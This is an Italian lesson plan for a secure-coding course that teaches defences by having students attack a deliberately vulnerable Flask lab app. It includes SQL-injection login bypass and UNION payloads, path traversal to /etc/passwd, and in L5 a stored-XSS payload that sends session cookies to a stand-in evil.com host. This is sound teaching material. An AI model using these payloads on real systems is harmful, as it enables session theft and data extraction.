# Piano dettagliato delle lezioni — Modulo Secure Coding

**Corso**: IFTS STEM — Specialista nelle Tecniche di Evoluzione e Manutenzione del Software
**Modulo**: Secure Coding (~16h, all'interno di UF 10/11/12)
**Modalità**: 8 incontri × 2h
**Discenti**: 20 giovani/adulti con diploma, in possesso di basi di programmazione (provenienti dalle UF 9-10 del corso)
**Linguaggio principale lab**: **Python 3.12 + Flask** (con esempi cross-lang Java/PHP/JS nelle slide)
**Approccio**: "vedi rotto → ripara" (costruzione di app vulnerabile, sfruttamento, correzione)
**Verifica finale**: lab pratico di code review su app vulnerabile

---

## Indice

- [Premessa per il docente](#prem)
- [Materiali di base da preparare prima](#prep)
- [L1 — Perché secure coding](#l1)
- [L2 — OWASP Top 10 + Threat Modeling](#l2)
- [L3 — SQL Injection](#l3)
- [L4 — Broken Access Control + Password hashing](#l4)
- [L5 — XSS + Header HTTP](#l5)
- [L6 — Input validation + Supply chain](#l6)
- [L7 — Documentazione sicurezza + Uso responsabile dell'AI](#l7)
- [L8 — Lab integrato + Verifica](#l8)
- [Valutazione](#val)
- [Allegati e materiali distribuibili](#all)

---

<a name="prem"></a>
## Premessa per il docente

### Posizionamento del modulo

Questo modulo si colloca **dopo** che i discenti hanno fatto:
- UF 9 (progettazione software) — conoscono OOP, ciclo di vita
- UF 10 (almeno la parte Python) — sanno scrivere semplici script + Flask hello-world
- UF 11 inizio — conoscono SQL basico e CSS

E **prima/parallelo** a:
- UF 12 (testing)
- UF 13 (manutenzione)
- UF 7 (documentazione) — collegamento L7

### Stile didattico raccomandato

1. **Concretezza prima della teoria**. Apri ogni lezione con un caso reale.
2. **Vedi attacco riuscire → poi spieghi difesa**. Memorabilità ×10.
3. **Lab guidato, non assegnato**. Il docente sta al banco, segue i discenti.
4. **Errore come strumento**. Quando uno studente sbaglia, è un'occasione per spiegare a tutti.
5. **Stampa e distribuisci** la Checklist Secure Coding da L1. Tienila sotto gli occhi.

### Cose da NON fare

- ❌ Frontale puro per 2h. Massimo 30 min consecutivi prima di un lab.
- ❌ Sovraccarico di nomenclatura (OWASP, CWE, CVE, CVSS, STRIDE…). Spiega solo ciò che serve oggi.
- ❌ Aprire con la normativa. Si finirebbe per perdere la classe. La normativa è motivazione **dopo** aver capito la tecnica.

---

<a name="prep"></a>
## Materiali di base da preparare prima del corso

### Setup tecnico

Su ogni PC dei discenti (verificato prima di L1):

```bash
# Già fatto in UF 10 (dovrebbe essere già pronto)
python --version       # ≥ 3.12
code --version         # VS Code
pip install flask pytest bcrypt bleach pydantic[email] python-magic-bin requests
```

Verifica con un `hello.py` Flask. Se non funziona → 15 min recupero a L1.

### Materiali del repository

Da `https://github.com/ss4i/corso-stem-ifts-secure-coding`:
- `01_checklist_secure_coding.docx` — stampare per ogni discente
- `02_template_documentazione_sicurezza.docx` — distribuire in L7
- `02_template_documentazione_sicurezza_ESEMPIO_COMPILATO.docx` — distribuire in L7
- `03_guida_validazione_codice_IA.docx` — distribuire in L7

Da `https://github.com/ss4i/corso-its-cybersecurity-32h`:
- `02_lab/M6_sqli_step_by_step/` — repo intero del lab SQLi (clone in L3)
- Slide selezionate da `04_slide/` (M1, M6, M_EXTRA_input_validation) per supporto frontale

### File aula

- Stampe della Checklist Secure Coding (1 per discente)
- Stampe del briefing L8 (1 per discente)
- Proiettore con HDMI testato (slide pptx)
- Wi-Fi aula con accesso a Internet per Git clone

---

<a name="l1"></a>
## L1 — Perché secure coding (2h)

### Obiettivi formativi

Al termine della lezione il discente:
1. Sa definire la **CIA Triad** (Confidentiality, Integrity, Availability) con esempi
2. Distingue **sicurezza del codice** da sicurezza informatica/infrastrutturale
3. Cita almeno 3 casi reali di breach causati da errori di codice
4. Conosce i **5 principi del Secure Coding** (Least Privilege, Defense in Depth, Fail Secure, KISS, Separation of Duties)
5. Ha l'ambiente Python+Flask funzionante per i lab successivi

### Articolazione minuto per minuto

| Tempo | Attività | Modalità | Materiali |
|-------|----------|----------|-----------|
| 0:00 – 0:10 | Presentazione modulo, obiettivi, calendario, distribuzione **Checklist Secure Coding** stampata | Frontale | Slide intro |
| 0:10 – 0:25 | **Storytelling**: Equifax 2017 (147M record) raccontato come storia. *"Cosa hanno sbagliato?"* | Frontale | Slide caso |
| 0:25 – 0:40 | **CIA Triad** con esempi pratici (saldo conto = I, password = C, sito durante saldi = A) + cenni Authenticity/Non-repudiation/Accountability | Frontale + lavagna | |
| 0:40 – 0:55 | **Sicurezza del codice vs sicurezza infrastrutturale**: differenza, casi, perché un firewall NON ferma SQLi | Frontale | |
| 0:55 – 1:10 | **PAUSA** + verifica setup PC dei discenti | | |
| 1:10 – 1:30 | **Tassonomia minacce** (overview): malware, phishing, MITM, DoS, web app, supply chain, zero-day, insider | Frontale | Slide tassonomia |
| 1:30 – 1:50 | **5 Principi Secure Coding** con esempi positivi/negativi: Least Privilege, Defense in Depth, Fail Secure, KISS, Separation of Duties | Frontale + lavagna | Checklist sezione 1 |
| 1:50 – 2:00 | **Discussione aperta**: "Voi avete mai pensato alla sicurezza nelle UF di programmazione?" + presentazione del calendario delle 8 lezioni | Discussione | |

### Materiali per il docente

- Slide adattate da `04_slide/M1_slide_fondamenti.md` del repo 32h (~20 slide)
- Lavagna per disegnare CIA Triad
- Storia di Equifax pronta (3-4 frasi memorizzate)

### Materiali per il discente (consegnati a fine lezione)

- Checklist Secure Coding completa (stampata)
- Link al repo `ss4i/corso-stem-ifts-secure-coding`

### Verifica in-itinere

A fine lezione, **3 domande a campione**:
1. "Tre proprietà CIA?"
2. "Differenza tra Defense in Depth e Least Privilege?"
3. "Cosa è successo a Equifax in 1 frase?"

Se la classe non risponde, recupera 5 minuti nella prossima lezione.

### Compito per L2

Letture autonome:
- Sezione 1-2 della Checklist Secure Coding
- Aggiornare il proprio Python a 3.12 se non già fatto

### Errori da evitare in aula

- ❌ Iniziare con la normativa: noiosa, si perde la classe
- ❌ Slide piene di testo: usa esempi concreti
- ❌ Non distribuire la Checklist subito: serve come riferimento per tutto il modulo

---

<a name="l2"></a>
## L2 — OWASP Top 10 + Threat Modeling (2h)

### Obiettivi formativi

1. Sa cosa è **OWASP** e cosa contiene la Top 10:2025
2. Sa leggere un **CVE** e capire un **CVSS score**
3. Applica un **threat model leggero (STRIDE)** a un piccolo sistema
4. Disegna un **Data Flow Diagram** con trust boundary

### Articolazione minuto per minuto

| Tempo | Attività | Modalità |
|-------|----------|----------|
| 0:00 – 0:10 | Ripasso rapido L1 (3 domande) | Q&A |
| 0:10 – 0:25 | **OWASP**: chi sono, cosa producono (Top 10, ASVS, cheat sheet). Overview delle 10 voci 2021/2025 con un esempio per ognuna | Frontale |
| 0:25 – 0:45 | **CVE/CVSS**: formato CVE-AAAA-NNNNN, dove cercarli (NVD), come si legge il CVSS Base Vector. Esercizio live: cerchiamo CVE-2021-44228 (Log4Shell) → CVSS 10.0 | Frontale + demo |
| 0:45 – 1:00 | **PAUSA** | |
| 1:00 – 1:15 | **Threat Modeling**: cos'è, perché farlo PRIMA del codice. Le 4 domande di Shostack | Frontale |
| 1:15 – 1:30 | **STRIDE**: 6 categorie con un esempio per ognuna in un'app web tipica | Frontale + lavagna |
| 1:30 – 1:45 | **Data Flow Diagram**: 4 simboli (entità, processo, datastore, flusso) + trust boundary. Esempio guidato su mini app | Frontale + lavagna |
| 1:45 – 2:00 | **Workshop a coppie**: applicare STRIDE a un sistema fittizio "blog con login" — almeno 5 minacce identificate | Lab a coppie |

### Esercizio workshop STRIDE (15 min)

Distribuisci foglio bianco. Sistema:
> Un blog con: login utenti, post degli utenti (CRUD), commenti pubblici.

Consegna: disegnare DFD (utente, frontend, backend, DB) e identificare **almeno 5 minacce STRIDE** (almeno 1 per ogni lettera).

Output di ogni coppia: una tabella con 5 righe `Elemento | STRIDE | Descrizione`.

Discussione collettiva (5 min): ogni coppia espone 1 minaccia.

### Materiali per il docente

- Slide adattate da `04_slide/M5_slide_secdesign.md` (sezioni STRIDE + DFD)
- NVD aperto in browser per demo CVE
- Lavagna grande per DFD

### Verifica in-itinere

Workshop STRIDE = verifica formativa. Se i gruppi producono <3 minacce → ripasso STRIDE 5 min in L3.

### Compito per L3

- Leggere sezione 4 della Checklist (Database)
- Installare DB Browser for SQLite (se non già fatto in UF 11)

### Errori da evitare

- ❌ Spiegare tutte e 10 le voci OWASP in dettaglio: bastano 3-4 oggi (le altre nelle lezioni dedicate)
- ❌ Andare in profondità sui CVSS sub-vectors: basta capire le bande (Low/Medium/High/Critical)
- ❌ Saltare il workshop STRIDE: è il momento in cui si "applica" un metodo

---

<a name="l3"></a>
## L3 — SQL Injection (2h) ⭐ CUORE TECNICO

### Obiettivi formativi

1. Riconosce a vista una **SQL Injection** nel codice
2. Sa **eseguire** un login bypass con `' OR '1'='1'`
3. Sa **estrarre dati** con UNION SELECT
4. Sa **correggere** con query parametrizzate
5. Capisce perché filtrare gli apici **non funziona**

### Articolazione minuto per minuto

| Tempo | Attività | Modalità |
|-------|----------|----------|
| 0:00 – 0:10 | **Setup lab**: clone repo `ss4i/corso-its-cybersecurity-32h`, `cd 02_lab/M6_sqli_step_by_step`, venv, `pip install -r requirements.txt`, `python seed.py` | Lab guidato |
| 0:10 – 0:20 | **Step 1 del lab**: avvia `python app.py`, login legittimo con `alice@bank.it`/`alice_pass`. Tutti vedono il saldo. | Lab guidato |
| 0:20 – 0:35 | **Step 2 del lab**: login bypass live. Tutti digitano `' OR '1'='1' --` come email. Successo. *"Cosa è successo?"* | Lab guidato + discussione |
| 0:35 – 0:50 | **Spiegazione lavagna**: la query diventa `SELECT ... WHERE email='' OR '1'='1'`. SQL come **mescolanza di struttura e dati**. Perché è la vulnerabilità #1 dal 2003 | Frontale + lavagna |
| 0:50 – 1:05 | **PAUSA** | |
| 1:05 – 1:25 | **Step 3 del lab**: UNION SELECT per estrarre email+password da `/cerca`. *"Vedete? Avete appena rubato le password di tutti gli utenti."* | Lab guidato |
| 1:25 – 1:40 | **Step 4 (rapido)**: dimostrazione che `replace("'", "")` non basta — bypass con encoding/escape. **Perché whitelist > blacklist** | Lab guidato |
| 1:40 – 1:55 | **Step 5 del lab**: correzione con query parametrizzate `?` placeholder. Riprovare gli stessi attacchi → falliscono | Lab guidato |
| 1:55 – 2:00 | **Cross-lang**: stessa correzione in Java (PreparedStatement), PHP (PDO), JS (better-sqlite3). 1 slide finale | Frontale |

### Esempi cross-lang da mostrare in slide finale

```python
# Python
cur.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

```java
// Java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, userId);
```

```php
// PHP
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$userId]);
```

```javascript
// JS
const stmt = db.prepare("SELECT * FROM users WHERE id = ?");
const user = stmt.get(userId);
```

### Materiali per il docente

- Repo `ss4i/corso-its-cybersecurity-32h` clonato sul proprio PC
- Lab `02_lab/M6_sqli_step_by_step/` testato la sera prima
- Slide con i 4 esempi cross-lang
- Lavagna per disegnare la query "mescolata"

### Verifica in-itinere

Alla fine, **chiedi alla classe**:
- "Date un payload che bypassa il login senza UNION."
- "Perché parametrizzare protegge?"

Se 80% risponde correttamente → ok. Altrimenti recupero in L4.

### Compito per L4

- **Rifare** il lab a casa da soli (consolidamento)
- Leggere sezione 5 della Checklist (Auth e sessione)
- Eseguire i test pytest del lab: `pytest test_app.py -v` (sulla versione corretta tutti passano)

### Errori da evitare

- ❌ Spiegare la SQLi senza farla provare: si dimentica in 24h
- ❌ Saltare il "perché filtrare non basta": è il momento didattico più potente
- ❌ Dimenticare il commit/push della propria versione corretta (per ripartire da pulito a L4)

---

<a name="l4"></a>
## L4 — Broken Access Control / IDOR + Password hashing (2h)

### Obiettivi formativi

1. Distingue **autenticazione** da **autorizzazione**
2. Riconosce un **IDOR** e sa correggerlo con ownership check
3. Sa differenziare i status code **401 vs 403**
4. Sa hashare password con **bcrypt**
5. Capisce perché MD5/SHA-256 **non vanno** per password

### Articolazione minuto per minuto

| Tempo | Attività | Modalità |
|-------|----------|----------|
| 0:00 – 0:05 | Ripasso L3 (1 domanda + verifica che il lab a casa è funzionante) | Q&A |
| 0:05 – 0:15 | **Autenticazione vs Autorizzazione**: confronto, esempi (login = authn, vedere fatture proprie = authz) | Frontale + lavagna |
| 0:15 – 0:30 | **Cos'è IDOR**: l'utente loggato cambia l'ID nell'URL e vede risorse altrui. Esempio guidato con `/fattura/<id>` | Frontale + lavagna |
| 0:30 – 0:50 | **Lab IDOR**: estendiamo `bancapiccola-mini` con una rotta `/fattura/<id>` vulnerabile. Tutti la sfruttano cambiando l'ID. *"Avete appena visto il bonifico di un altro cliente."* | Lab guidato |
| 0:50 – 1:00 | **Correzione**: ownership check server-side (`filter_by(owner_id=current_user.id)`) + status code 403 corretto | Lab guidato |
| 1:00 – 1:15 | **PAUSA** | |
| 1:15 – 1:30 | **Encoding ≠ Hashing ≠ Encryption**: dimostrazione live Base64 vs SHA-256 vs bcrypt. Perché Base64 NON è cifratura | Frontale + demo |
| 1:30 – 1:45 | **Perché MD5/SHA-256 senza salt non vanno**: velocità GPU, rainbow table. Salt e perché è obbligatorio | Frontale + slide |
| 1:45 – 2:00 | **Lab bcrypt**: convertiamo `bancapiccola-mini` da SHA-256 a bcrypt. Mostriamo nel DB la differenza visiva: `5f4dcc3b...` (SHA) vs `$2b$12$...` (bcrypt) | Lab guidato |

### Cross-lang nella sezione hashing

```python
# Python
import bcrypt
hash_ = bcrypt.hashpw(pwd.encode(), bcrypt.gensalt(rounds=12))
ok = bcrypt.checkpw(pwd.encode(), hash_)
```

```java
// Java (Spring Security)
BCryptPasswordEncoder enc = new BCryptPasswordEncoder(12);
String hash = enc.encode(pwd);
boolean ok = enc.matches(input, hash);
```

```php
// PHP
$hash = password_hash($pwd, PASSWORD_BCRYPT, ['cost' => 12]);
$ok = password_verify($input, $hash);
```

### Materiali per il docente

- Slide adattate da `04_slide/M6_slide_appweb.md` (sezioni IDOR + Crypto)
- DB Browser for SQLite aperto per mostrare visivamente i tipi di hash
- Tabella "diagnosi visiva password nel DB"

### Verifica in-itinere

Domanda: *"Differenza tra 401 e 403?"*. Se la classe sbaglia → ripassa con un esempio.

Verifica DB Browser: tutti aprono il DB del proprio lab, vedono che le password sono ora `$2b$12$...`.

### Compito per L5

- Sezione 3 della Checklist (Output)
- Riflessione scritta (mezza pagina): *"Nel mio progetto di UF 10, le password sono salvate come? Devo modificare qualcosa?"*

### Errori da evitare

- ❌ Trattare auth/authz come la stessa cosa: è il bug concettuale #1 dei junior
- ❌ Saltare l'esempio Base64: serve per smontare l'idea che "encoding = crittografia"
- ❌ Non far vedere il DB: l'impatto visivo è enorme

---

<a name="l5"></a>
## L5 — Cross-Site Scripting (XSS) + Header HTTP di sicurezza (2h)

### Obiettivi formativi

1. Distingue i **3 tipi di XSS** (Reflected, Stored, DOM-based)
2. Sa **eseguire** un XSS riflessa
3. Sa **correggere** con escape automatico (Jinja2/Twig) e CSP
4. Conosce i **6 header HTTP di sicurezza** principali
5. Sa configurare cookie sicuri (Secure, HttpOnly, SameSite)

### Articolazione minuto per minuto

| Tempo | Attività | Modalità |
|-------|----------|----------|
| 0:00 – 0:10 | **Come funziona un browser** (sandbox, JS, DOM). Same-Origin Policy in 3 minuti | Frontale |
| 0:10 – 0:25 | **I 3 tipi di XSS**: Reflected (URL), Stored (DB), DOM-based (JS). Tabella riassuntiva. Quale è più grave? | Frontale + slide |
| 0:25 – 0:45 | **Lab Reflected XSS**: aggiungiamo a `bancapiccola-mini` un endpoint `/cerca?q=...` che riflette `q` senza escape. Payload `<script>alert(1)</script>`. Tutti vedono l'alert nel browser | Lab guidato |
| 0:45 – 1:00 | **Lab Stored XSS**: aggiungiamo commenti su una pagina. Payload `<script>fetch('https://evil.com/?c='+document.cookie)</script>`. Spieghiamo come ruberebbe il cookie di sessione (collegamento L4) | Lab guidato |
| 1:00 – 1:15 | **PAUSA** | |
| 1:15 – 1:30 | **Correzione**: Jinja2 escape automatico (`{{ var }}` invece di `\|safe`). Mostra che in PHP `htmlspecialchars()`, in JS React fa già escape | Lab guidato + slide |
| 1:30 – 1:50 | **Header HTTP di sicurezza** — tour rapido: HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy. Demo: visitare un sito su securityheaders.com | Frontale + demo |
| 1:50 – 2:00 | **Cookie sicuri**: Secure + HttpOnly + SameSite=Lax. Aggiunta a Flask config (`SESSION_COOKIE_*`). Spieghi che HttpOnly avrebbe **bloccato** il furto cookie via XSS | Lab guidato |

### Demo securityheaders.com

Mostra in proiezione l'output di:
- `https://github.com` (voto A)
- `https://www.python.org` (voto B/A)
- Un sito italiano scadente (es. un piccolo comune — molti hanno F)

Discussione: *"Perché questa differenza?"*.

### Materiali per il docente

- Slide da `04_slide/M3_slide_http.md` (sezioni header sicurezza + cookie)
- Slide da `04_slide/M6_slide_appweb.md` (sezione XSS)
- securityheaders.com aperto
- Lavagna per disegnare il furto cookie via XSS

### Verifica in-itinere

Domanda: *"Quale header HTTP forza HTTPS dopo la prima visita?"* → HSTS.
Verifica pratica: tutti aggiungono `SESSION_COOKIE_HTTPONLY=True` al loro `bancapiccola-mini`.

### Compito per L6

- Sezione 2 della Checklist (Input validation)
- Test su sito di propria scelta con securityheaders.com — annotare voto e mancanze

### Errori da evitare

- ❌ Spiegare XSS senza farla **vedere nel browser**: l'alert popup è il momento didattico
- ❌ CSP in dettaglio (è complessa): basta sapere che esiste e a cosa serve
- ❌ Cookie senza il furto via XSS: il "perché HttpOnly" si capisce solo dopo aver visto la minaccia

---

<a name="l6"></a>
## L6 — Input validation + Supply chain (2h)

### Obiettivi formativi

1. Distingue **validation, sanitization, encoding**
2. Usa **Pydantic** per validation strutturata in Python
3. Usa **bleach** per sanitizzare HTML "ricco"
4. Comprende **path traversal** e sa correggerlo
5. Sa eseguire `pip-audit` per scoprire CVE in dipendenze

### Articolazione minuto per minuto

| Tempo | Attività | Modalità |
|-------|----------|----------|
| 0:00 – 0:10 | **Validation vs Sanitization vs Encoding** (10 min): cosa fa cosa, quando si usa | Frontale + lavagna |
| 0:10 – 0:25 | **Whitelist > Blacklist**: perché. Esempi di bypass di blacklist (encoding, varianti) | Frontale + slide |
| 0:25 – 0:50 | **Lab Pydantic**: scriviamo un form di registrazione con UserCreate (username, email, password, birthdate, bio). Tutti scrivono il proprio modello con validators custom. Test casi limite (minorenne, email malformata, ecc.) | Lab guidato |
| 0:50 – 1:05 | **Lab bleach**: sanitizziamo HTML per i commenti. Demo: `<script>alert(1)</script>` rimosso, `<a href="javascript:...">` neutralizzato | Lab guidato |
| 1:05 – 1:20 | **PAUSA** | |
| 1:20 – 1:40 | **Lab Path Traversal**: endpoint `/download?file=...` con `f"./uploads/{filename}"`. Tutti provano `?file=../app.py`. Correzione con `os.path.realpath` + `startswith` | Lab guidato |
| 1:40 – 1:55 | **Supply chain — pip-audit**: installazione, run su un `requirements.txt` con `flask==2.0.0`. Trova CVE. Aggiornamento. Discussione: Dependabot, SBOM (CRA dal 2027) | Lab guidato |
| 1:55 – 2:00 | **Cross-lang validation**: Bean Validation in Java (`@Email`, `@Min`), Zod in TypeScript. Stessa idea, sintassi diversa | Frontale |

### Esempio Pydantic completo (mostra in slide)

```python
from pydantic import BaseModel, EmailStr, Field, field_validator
from datetime import date

class UserCreate(BaseModel):
    username: str = Field(min_length=3, max_length=20, pattern=r"^[a-zA-Z0-9_]+$")
    email: EmailStr
    password: str = Field(min_length=12)
    birthdate: date

    @field_validator("birthdate")
    @classmethod
    def adult(cls, v):
        if (date.today() - v).days < 18 * 365:
            raise ValueError("devi essere maggiorenne")
        return v
```

### Materiali per il docente

- Lab `M_EXTRA_input_validation_lab.py` del repo 32h come riferimento
- Requirements.txt con flask 2.0.0 pre-fatto (per dimostrare pip-audit)
- Slide cross-lang per Bean Validation/Zod

### Verifica in-itinere

Ogni discente esegue il proprio Pydantic model con almeno 3 casi limite e li vede bloccati. Test rapido: chi ha implementato correttamente la validazione "almeno 18 anni"?

### Compito per L7

- Sezione 7 della Checklist (Gestione segreti)
- Letture: **Guida AI completa** (`03_guida_validazione_codice_IA.docx`)

### Errori da evitare

- ❌ Saltare la distinzione "validation/sanitization/encoding": è la radice di molti errori
- ❌ Pydantic senza casi limite: serve far **fallire** la validation per capire
- ❌ pip-audit senza una vulnerabilità reale da trovare: vedere il CVE è il momento

---

<a name="l7"></a>
## L7 — Documentazione di sicurezza + Uso responsabile dell'AI (2h)

### Obiettivi formativi

1. Sa **strutturare** un documento `SECURITY.md` per un progetto
2. Compila almeno una sezione del template per il proprio progetto UF 10/11
3. Conosce i **7 errori tipici** del codice generato da AI
4. Sa applicare il **workflow di validazione in 4 step** ai suggerimenti AI
5. Sa quando **NON** usare l'AI

### Articolazione minuto per minuto

| Tempo | Attività | Modalità |
|-------|----------|----------|
| 0:00 – 0:10 | **Perché documentare la sicurezza**: requisito GDPR Art. 32, NIS 2, CRA. Collegamento UF 7 (documentazione tecnica) | Frontale |
| 0:10 – 0:25 | **Tour del Template**: 9 sezioni di `SECURITY.md`. Distribuzione di `02_template_documentazione_sicurezza.docx` e dell'esempio compilato MiniBlog | Frontale + slide |
| 0:25 – 0:55 | **Lab a coppie**: ogni coppia inizia a compilare il template per il **proprio progetto** (quello che porteranno avanti in UF 10/11/12/13 → stage). Compilare almeno: Sezione 1, Sezione 2 (DFD + 5 minacce), Sezione 3.1-3.2 | Lab a coppie |
| 0:55 – 1:10 | **PAUSA** | |
| 1:10 – 1:25 | **Uso dell'AI nello sviluppo**: Copilot, Claude, ChatGPT. Perché serve validare. I 7 errori tipici (con esempi) | Frontale + slide |
| 1:25 – 1:45 | **Workflow validazione in 4 step**: lettura, scan pattern, contesto, test. Esempio guidato: prendi un suggerimento ChatGPT pre-preparato (vulnerabile) e applica la checklist | Frontale + demo live |
| 1:45 – 1:55 | **Casi pratici**: 4 esempi di codice AI vulnerabile (login con SHA-256, IDOR, run_cmd, upload). Discussione "cosa correggeresti?" | Discussione |
| 1:55 – 2:00 | **Aspetti etici**: mai segreti nei prompt, IP, policy aziendale, GDPR. EU AI Act in 2 minuti | Frontale |

### Esercizio in classe — validazione codice AI

Distribuisci agli studenti questo snippet generato da ChatGPT (lavagna o slide):

```python
@app.route("/api/profile/<int:user_id>", methods=["PUT"])
def update_profile(user_id):
    data = request.json
    user = User.query.get(user_id)
    for key, value in data.items():
        setattr(user, key, value)
    db.session.commit()
    return jsonify(user.to_dict())
```

Chiedi: *"Quante vulnerabilità trovate?"*.

Discussione collettiva (5 min):
1. ✅ No auth richiesta
2. ✅ IDOR (cambio user_id)
3. ✅ Mass Assignment (`role: admin`)
4. ✅ Nessuna validation input
5. ✅ Espone tutti i campi (`to_dict()`)

### Materiali per il docente

- `02_template_documentazione_sicurezza.docx` (stampato)
- `02_template_documentazione_sicurezza_ESEMPIO_COMPILATO.docx` (stampato come riferimento)
- `03_guida_validazione_codice_IA.docx` (distribuito digitalmente)
- Snippet AI vulnerabili pre-preparati su slide

### Verifica in-itinere

A fine lezione, ogni coppia consegna **una pagina** del proprio template compilata (sezione 1 + 2). Vale come parte della valutazione finale.

### Compito per L8

- Completare il template SECURITY.md fino alla sezione 3.4
- Ripasso integrale della Checklist Secure Coding
- Setup di **BancaPiccola-vuln** (`git clone https://github.com/ss4i/corso-its-cybersecurity-32h` → `cd 02_lab/M6_sqli_step_by_step` per familiarizzare con la struttura)

### Errori da evitare

- ❌ Trattare la documentazione come "compito noioso da fare alla fine": va integrata nello sviluppo
- ❌ Demonizzare l'AI: i discenti la useranno comunque. Insegna a usarla bene
- ❌ Saltare l'esempio pratico di validazione codice AI: è il momento più memorabile

---

<a name="l8"></a>
## L8 — Lab integrato + Verifica (2h)

### Obiettivi formativi

1. Applica **trasversalmente** tutto ciò che ha imparato nel modulo
2. Identifica almeno **3 vulnerabilità** in un'app reale
3. Produce un **mini-report** scritto con PoC e fix proposto
4. È valutato sul lab pratico

### Articolazione minuto per minuto

| Tempo | Attività | Modalità |
|-------|----------|----------|
| 0:00 – 0:10 | **Briefing**: scenario "Sei un junior security analyst. BancaPiccola ti chiede una review prima del lancio. Trova le vuln, scrivi un mini-report." Regole + tempistica | Frontale |
| 0:10 – 1:30 | **Lavoro individuale o a coppie (80 min)**: review di un'app vulnerabile pre-preparata dal docente (può essere `bancapiccola-mini` finale + 3-5 vuln aggiuntive). Output: file `report.md` | Lab attivo individuale/coppie |
| 1:30 – 1:50 | **Discussione collettiva**: ognuno presenta in 2 min la propria vulnerabilità "preferita" + fix | Discussione |
| 1:50 – 2:00 | **Chiusura modulo**: riassunto, takeaway, distribuzione finale Checklist + cartaceo dei 3 documenti + link al repo per autostudio | Frontale |

### Setup app per la verifica

Il docente prepara una versione dell'app vulnerabile (può clonare il repo `M6_sqli_step_by_step` e aggiungerci:
- 1 vulnerabilità XSS (commenti)
- 1 IDOR su `/fattura/<id>`
- 1 path traversal su `/download?file=`
- 1 cookie senza HttpOnly
- (Opzionale) 1 CVE in `requirements.txt` con `pip-audit` come strumento di scoperta

I discenti devono trovarne almeno **3 su 5+**.

### Cheat-sheet di campo (distribuito agli studenti a inizio L8)

```
🔍 DOVE CERCARE:

SQL Injection:    form login, form ricerca, qualunque input → query
                  Test rapido: ' OR '1'='1' --

IDOR:             URL con ID numerici (/fattura/42)
                  Test: cambia l'ID, vedi se accedi

XSS:              campi che vengono rivisualizzati (commenti, profilo)
                  Test: <script>alert(1)</script>

Crypto Failures:  apri il DB con DB Browser, vedi le password
                  In chiaro / MD5 / SHA-1 / bcrypt?

Path Traversal:   endpoint con parametro filename
                  Test: ?file=../etc/passwd

Cookie / Header:  DevTools → Application → Cookies (HttpOnly?)
                  DevTools → Network → Response Headers (HSTS? CSP?)

Supply Chain:     pip-audit -r requirements.txt
```

### Template del report (distribuito)

```markdown
# Mini Security Report — BancaPiccola

**Reviewer**: [nome cognome]
**Data**: [data]
**Tempo speso**: ~80 minuti

## Executive Summary
In 2-3 frasi: numero vuln, severity più alta, raccomandazione generale.

## Findings

### F-01 — [Titolo descrittivo]
- **Severity**: Critical / High / Medium / Low
- **Localizzazione**: file:riga
- **Categoria OWASP**: A0X
- **Norma violata**: GDPR Art. ?

**Descrizione**: 2-3 paragrafi.

**Proof of Concept**:
```
[comando o screenshot]
```

**Fix proposto**:
```python
[codice corretto]
```

### F-02 — ...
### F-03 — ...

## Raccomandazioni generali
[opzionale: cose non specifiche a una vuln]
```

### Materiali per il docente

- App vulnerabile pre-preparata e testata (con le 5+ vulnerabilità)
- Stampe del cheat-sheet (1 per studente)
- Template del report (digitale via email/Teams)
- Griglia di valutazione (vedi sezione [Valutazione](#val))

### Modalità di consegna

Ogni studente consegna il proprio `report.md` (o `.docx`/`.pdf`) tramite:
- email al docente
- piattaforma e-learning del corso (se disponibile)
- consegna stampata

Tempo limite: fine lezione + 24h per chi vuole rifinire.

### Errori da evitare

- ❌ Non testare l'app vulnerabile prima della lezione: rischi che qualche vuln non sia sfruttabile
- ❌ Mettere troppe vulnerabilità (>7): 80 minuti diventano stressanti
- ❌ Non distribuire il cheat-sheet: chi non sa da dove iniziare blocca

---

<a name="val"></a>
## Valutazione

### Griglia (su 100 punti)

| Voce | Peso | Cosa valutare |
|------|------|---------------|
| **Partecipazione attiva** (L1-L7) | 10 | Presenza + interazione + compiti consegnati |
| **Workshop STRIDE** (L2) | 10 | Qualità minacce identificate, completezza DFD |
| **Lab pratici** (L3-L6) | 20 | Esecuzione corretta di tutti i lab in classe |
| **Compilazione template SECURITY.md** (L7) | 20 | Sezioni 1-2-3.1-3.2 compilate con coerenza |
| **Mini-report finale** (L8) | 40 | Vedi sotto |

### Sotto-griglia mini-report L8 (su 40 punti)

| Voce | Peso | Note |
|------|------|------|
| Numero vulnerabilità identificate (≥3) | 8 | 3 = sufficiente, 5+ = ottimo |
| Correttezza tecnica delle PoC | 12 | PoC funziona davvero? |
| Qualità dei fix proposti | 12 | Codice corretto, idiomatico |
| Severity giustificata | 4 | Coerente con impatto reale |
| Categoria OWASP / norma violata | 4 | Mapping corretto |

### Mappatura voto finale

| Punteggio | Voto |
|-----------|------|
| 90-100 | Eccellente |
| 75-89 | Buono |
| 60-74 | Sufficiente |
| < 60 | Non sufficiente (eventuale recupero) |

### Modalità di recupero

Per chi non raggiunge 60:
- Consegna **aggiuntiva**: un secondo mini-report su un'app diversa (vedere `02_lab/M_EXTRA_devsecops_lab/` come riferimento)
- Tempo: 1 settimana
- Vale max 60/100

---

<a name="all"></a>
## Allegati e materiali distribuibili (riepilogo)

### Distribuiti durante il corso

| Lezione | Materiale |
|---------|-----------|
| L1 | Checklist Secure Coding completa (stampa) |
| L1 | Link a `ss4i/corso-stem-ifts-secure-coding` |
| L7 | Template documentazione + esempio compilato MiniBlog |
| L7 | Guida AI completa |
| L8 | Cheat-sheet di campo (stampa) |
| L8 | Template del report |

### Setup tecnico richiesto

```bash
# Su ogni PC (verificato in L1)
python --version       # ≥ 3.12
pip install flask pytest bcrypt bleach pydantic[email] python-magic-bin requests pip-audit
```

Browser moderno + DevTools + DB Browser for SQLite.

### Risorse esterne raccomandate (autostudio)

- **OWASP Top 10**: https://owasp.org/Top10
- **OWASP Cheat Sheet Series**: https://cheatsheetseries.owasp.org
- **PortSwigger Web Security Academy** (gratuita): https://portswigger.net/web-security
- **Garante Privacy** (provvedimenti italiani): https://www.garanteprivacy.it
- **EU AI Act** (testo italiano): https://eur-lex.europa.eu/eli/reg/2024/1689/oj

### Collegamenti con altre UF

| UF | Collegamento |
|----|--------------|
| **UF 6** | "Opportunità e rischi dell'IA" → L7 Guida AI |
